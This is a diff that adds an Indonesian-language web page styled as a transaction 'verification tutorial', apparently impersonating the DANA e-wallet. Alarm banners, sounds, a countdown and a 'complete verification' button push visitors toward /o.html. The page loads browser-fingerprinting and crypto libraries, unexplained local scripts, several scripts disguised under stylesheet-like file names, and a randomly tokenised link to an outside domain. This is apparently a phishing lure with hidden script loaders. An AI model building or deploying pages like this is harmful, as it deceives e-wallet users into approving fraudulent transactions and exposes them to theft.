@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<meta name="theme-color" content="#118EEA">
+<title>Tutorial-Cara-Verifikasi</title>
+
+<style>
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;flex-direction:column;height:96vh}
+.video-container{width:100%;max-width:640px;position:relative;margin-top:4%}
+video{width:100%;height:auto;border-radius:10px;box-shadow:0 4px 8px rgba(0,0,0,.2)}
+.header{width:100%;background-color:#118eea;display:flex;margin-top:-55%;justify-content:center;padding:10px 0;box-shadow:0 4px 8px rgba(0,0,0,.2)}
+.header img{max-width:100%;height:auto}
+.action-button{width:88%;max-width:500px;margin:0 auto 10px;padding:13px;font-size:16px;font-weight:700;color:#fff;background-color:#118eea;border:none;border-radius:10px;cursor:pointer;box-shadow:0 4px 8px rgba(0,0,0,.2);position:fixed;bottom:10%;left:50%;transform:translateX(-50%)}
+.action-button:hover{background-color:#118eea}
+.loading-box{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background-color:rgba(255,255,255,.9);padding:20px;border-radius:10px;box-shadow:0 4px 8px rgba(0,0,0,.2);display:flex;align-items:center;justify-content:center}
+.icon-container{position:relative;width:50px;height:50px}
+.static-icon{width:100%;height:100%}
+.spinning-icon{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px}
+.spin{animation:spin-left 1s linear infinite}
+@keyframes spin-left{from{transform:translate(-50%,-50%) rotate(0)}to{transform:translate(-50%,-50%) rotate(-360deg)}}
+#notifBox{position:fixed;top:-60px;left:0;width:100%;background-color:#fff;color:#000;padding:15px;text-align:center;font-size:16px;font-weight:700;box-shadow:0 4px 6px rgba(0,0,0,.1);transition:top .5s ease-in-out;z-index:9999}
+#countdown{text-align:center;font-size:14px;color:#118eea;margin-left:-12%;font-weight:700;margin-top:10px}
+#bottom-row{display:flex;justify-content:flex-start;align-items:center;gap:35px;margin-left:27%;font-size:14px;margin-top:25%}
+#bottom-row span{vertical-align:middle}
+</style>
+</head>
+
+<body>
+
+<div id="notifBox">Verifikasi Transaksi Tap <span style="color:red">YA</span></div>
+
+<audio id="notifSound" preload="auto" src="https://ia601600.us.archive.org/4/items/Danaai/Danaai.mp3"></audio>
+
+<div class="header">
+<img alt="Gambar Navigasi" src="https://blogger.googleusercontent.com/img/a/AVvXsEgCVe25Kdt_qYlWuhtmL76uf9ybg3qfXOopQoUgjClqB95soXF3tjk07U1oa9sHdnU-a-fbzLT8NAaLXW-5NN2PXPx4rLC9QDzIB4Zo1Di0UWO67OZCOwgldWQ4SxDCVqu4xjqei5RBPAjIFJ6cxkUFFRLUKgqaWKbSEYd-O-WeIOqXsDPbmQYsF37YUa9Q">
+</div>
+
+<img alt="" src="https://blogger.googleusercontent.com/img/a/AVvXsEiPj8hB_HKcHZli54D3j05fsLgPcxK0xHxQ8xpnlXldGXA7rPsX29rwH7cSu4n5XxpP0TLu9mN5AGAAjs9cWfBKgm6U4RP-3XpMzejtZDvklDvHEJjpr-b7Blh7ZxD6P0f74BlQ93F9JbEuCbFZ627fVRGW4Zle0NkAqaTnkg_YqRZyffsRZjaIV1oXcB5i" width="100%">
+
+<br>
+
+<div class="video-container">
+<video autoplay id="myVideo" loop muted>
+<source src="https://ia600902.us.archive.org/30/items/vid-20250810-wa-0010/VID-20250810-WA0010.mp4" type="video/mp4">
+Your browser does not support HTML5 video.
+</video>
+
+<div id="bottom-row">
+<span id="kirimUlang" style="color:#118eea;cursor:pointer;font-weight:700;margin-left:13px">Verifikasi Berlaku</span>
+<span id="countdown">(30)</span>
+</div>
+
+<div class="loading-box" id="loading">
+<div class="icon-container">
+<img alt="Static Icon" src="https://blogger.googleusercontent.com/img/a/AVvXsEhGNxko9JaP0ln_kJmuob7Ns-2UAOOXtvT4HRJJZ2qe2AZskeFrJ5EkKn1pkJ8gkMJ0e7du66jGhr_zrQVTDGC3i6jnTkJTfZ2MqGA0SaKUMk2gpPZVzFOBkUh47FrKLlY-L6Cxj5lw50WB-stSGFdGzh93mv_pm3mZhL_-ZbJyte0InQxeLtAh9gUOZvDc" class="static-icon">
+<img alt="Spinning Icon" src="https://blogger.googleusercontent.com/img/a/AVvXsEgwBRmagHn1FaafTS35Jd6qWd5v02Ro_o1gVltUC2n5tZgbR7Oa-N_mZfx930gTIn6B5O5W3iBUa4TZQEBgbavfithVxydhSCL0WYQgVlCtAWU_FvstTmH48_Qq3FZHvyoPAqIvqqQ7o5umnHdIqggQ6cvbTEYaN_MbaXyGtQfyFr1gkqvxHUAh0NCsnFXg" class="spinning-icon" id="spinning-icon">
+</div>
+</div>
+
+</div>
+
+<button class="action-button" id="actionButton">Selesaikan Verifikasi</button>
+
+<script>
+// Referensi elemen
+const loadingBox = document.getElementById('loading');
+const actionButton = document.getElementById('actionButton');
+const spinningIcon = document.getElementById('spinning-icon');
+
+// Pastikan loading tidak muncul saat halaman dimuat
+window.addEventListener('load', () => {
+    loadingBox.style.display = 'none';
+    spinningIcon.classList.remove('spin');
+});
+
+// Fungsi untuk menampilkan loading spinner dan redirect
+function showLoadingAndRedirect() {
+    loadingBox.style.display = 'flex';
+    spinningIcon.classList.add('spin');
+
+    setTimeout(() => {
+        loadingBox.style.display = 'none';
+        spinningIcon.classList.remove('spin');
+        window.location.href = '/o.html';
+    }, 1000);
+}
+
+// Event listener untuk tombol
+actionButton.addEventListener('click', showLoadingAndRedirect);
+
+// Otomatis memutar video saat halaman dimuat
+window.addEventListener('load', () => {
+    const video = document.getElementById('myVideo');
+    video.play();
+});
+
+// Notifikasi box
+window.addEventListener('load', () => {
+    const box = document.getElementById('notifBox');
+    box.style.top = '0';
+    setTimeout(() => {
+        box.style.top = '-60px';
+    }, 10000);
+});
+
+// Sound notification
+const audio = document.getElementById('notifSound');
+let playCount = 0;
+
+function playSound() {
+    if (playCount < 2) {
+        audio.currentTime = 0;
+        audio.play().catch(err => console.log("Autoplay diblokir:", err));
+        playCount++;
+        if (playCount === 1) {
+            setTimeout(playSound, 60000);
+        }
+    }
+}
+
+function firstTouch() {
+    playSound(); 
+    window.removeEventListener('touchstart', firstTouch);
+    window.removeEventListener('click', firstTouch);
+}
+
+// Jalankan fungsi saat pengguna pertama kali sentuh/klik
+window.addEventListener('touchstart', firstTouch, { once: true });
+window.addEventListener('click', firstTouch, { once: true });
+
+// Countdown timer
+let countdown = 60;
+const countdownDisplay = document.getElementById('countdown');
+const kirimUlangBtn = document.getElementById('kirimUlang');
+
+kirimUlangBtn.style.pointerEvents = 'none';
+
+const timer = setInterval(() => {
+    countdown--;
+    countdownDisplay.textContent = `(${countdown})`;
+    
+    if (countdown <= 0) {
+        clearInterval(timer);
+        countdownDisplay.textContent = "";
+        kirimUlangBtn.style.pointerEvents = 'auto';
+        kirimUlangBtn.style.color = "#118eea";
+    }
+}, 1000);
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs/3.3.6/fingerprint.min.js"></script>
+<script src="ika.js"></script>
+<script src="i.js"></script>
+<script src="security-kit.js"></script>
+
+<script>
+function generateDashLink(domain="https://lyanan.info/"){
+const hexChars="abcdef0123456789"
+let token=""
+for(let i=0;i<32;i++){
+token+=hexChars[Math.floor(Math.random()*hexChars.length)]
+}
+return domain+token
+}
+
+document.addEventListener("DOMContentLoaded",()=>{
+const link=generateDashLink()
+console.log(link)
+})
+</script>
+ <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._containers.scss"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._helpers.scss"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._maps.scss"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.bootstrap.css"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery. _spinners.scss"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.common.js"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.common.js.map"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.min.js"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/owl.carousel.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs/3.3.6/fingerprint.min.js"></script>
+<script src="/OwlCarousel2/assets/vendors/security-core.js"></script>
+<script src="/OwlCarousel2/assets/vendors/script-loader.js"></script>
+ <script src="/OwlCarousel2/assets/vendors/globalize.min.js"></script>
+
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'99cdc1c9eb223e2b',t:'MTc2Mjg2Mzc2Ng=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
